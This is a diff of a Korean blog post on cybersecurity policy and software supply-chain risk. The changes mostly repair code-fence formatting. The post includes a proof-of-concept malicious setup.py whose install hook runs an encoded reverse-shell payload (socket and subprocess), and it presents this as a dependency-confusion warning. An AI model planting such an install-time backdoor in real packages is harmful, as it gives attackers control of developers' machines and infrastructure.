@@ -30,8 +30,7 @@ categories:
 
 아래 다이어그램은 정책 변화에 따른 위협 환경의 변화와 공격자의 접근 경로를 시각화한 것입니다.
 
-````mermaid`
-
+```mermaid
 graph TD
     A[정책 변화: 규제 완화 & 공격적 억제] --> B[공급망 보안 책임 이양]
     A --> C[AI 기술 경쟁 가속화]
@@ -52,8 +51,7 @@ graph TD
 
     style A fill:#f9f,stroke:#333,stroke-width:2px
     style H fill:#bbf,stroke:#333,stroke-width:2px
-
-`````
+```
 
 ## 실제 공격 예시 (Attack Example)
 
@@ -61,16 +59,13 @@ graph TD
 
 다음은 이러한 공격 시나리오를 시뮬레이션한 Python 코드 예시입니다.
 
-````python`
-
+```python
 # 공격자가 PyPI 등의 공개 저장소에 업로드하는 악성 패키지 코드 예시 (setup.py 일부)
-
 from setuptools import setup
 import base64
 import os
 
 # 백도어 설치 스크립트 (Base64 인코딩되어 은폐됨)
-
 PAYLOAD = """
 import socket, subprocess, os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -93,8 +88,7 @@ setup(
     # install 후킹을 통한 악성 코드 실행
     cmdclass={'install': install_backdoor}
 )
-
-`````
+```
 
 이 PoC(Proof of Concept)는 패키지 설치 시점에 역접속(Reverse Shell)을 시도하는 간단한 백도어를 보여줍니다. 만약 기업이 내부 패키지 저장소(Private Registry) 설정을 엄격하게 관리하지 않는다면, 개발자의 `pip install` 명령어 한 줄이 인프라 전체의 장악당하게 됩니다. 이는 신정부의 민간 자율성 강조 기조 하에서, 기업이 내부 거버넌스를 소홀히 할 경우 겪을 수 있는 구체적인 위협입니다.
 
@@ -114,7 +108,7 @@ setup(
 
 ## 참고자료
 
-- [Five updates on the Trump admin’s cybersecurity agenda - Federal News Network](https://news.google.com/rss/articles/CBMiqwFBVV95cUxNNjlzT2k3Qy1VNTJsRGNTbnR3NVpEQVAzWXR4eENSR3BEVXUxZHdyU0tVZEJXd19MMi1TOHpvS1RHdndsRlhwa2dtbGNjTmZHcms4WWFOaTh1aXVEOUVjR2Z6R2FpVjNtVEJJUDZEMkdGeFlGbnZRdkx6Nl95THc0SGhlbzFtZ2lEbTVISXI3TTIyNGVQZlhhLUtmSGtScjJ4d3cyNmludFRKdFk?oc=5)
+- [Five updates on the Trump admin's cybersecurity agenda - Federal News Network](https://news.google.com/rss/articles/CBMiqwFBVV95cUxNNjlzT2k3Qy1VNTJsRGNTbnR3NVpEQVAzWXR4eENSR3BEVXUxZHdyU0tVZEJXd19MMi1TOHpvS1RHdndsRlhwa2dtbGNjTmZHcms4WWFOaTh1aXVEOUVjR2Z6R2FpVjNtVEJJUDZEMkdGeFlGbnZRdkx6Nl95THc0SGhlbzFtZ2lEbTVISXI3TTIyNGVQZlhhLUtmSGtScjJ4d3cyNmludFRKdFk?oc=5)
 - [CISA (Cybersecurity and Infrastructure Security Agency) Guidelines](https://www.cisa.gov/)
 - [OWASP Dependency Confusion](https://owasp.org/www-community/attacks/Dependency_Confusion)
 
